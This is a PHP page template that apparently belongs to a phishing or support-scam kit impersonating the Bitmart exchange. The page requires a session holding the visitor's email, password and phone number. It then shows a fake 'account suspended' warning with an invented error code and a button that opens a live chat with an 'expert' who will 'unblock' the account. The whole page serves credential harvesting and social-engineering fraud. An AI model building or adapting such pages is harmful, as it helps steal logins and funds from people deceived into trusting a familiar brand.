<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Bitmart | Account';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container my60'>
            <div class="row justify-content-center">
                <div class='col-sm-4 shadow rounded-2 p25 my60' style="position: relative">
                    <div style="position: absolute;top:0;right:3;"><i class="fa-solid fa-barcode fs50"></i></div>
                    <div class="my20 px20">
                        <div class="fs21 py5 text-danger text-center fw-medium">Important Message !</div>
                        <div class="py1 mt10 lh30 fs13">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.</div>
                        <div class='fs18 pt25 text-center fw-semibold'>Error CODE: EBRX1:6X76D</div>
                    </div>
                    <div class='text-center'>
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary-2 text-white px20">Ask expert</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>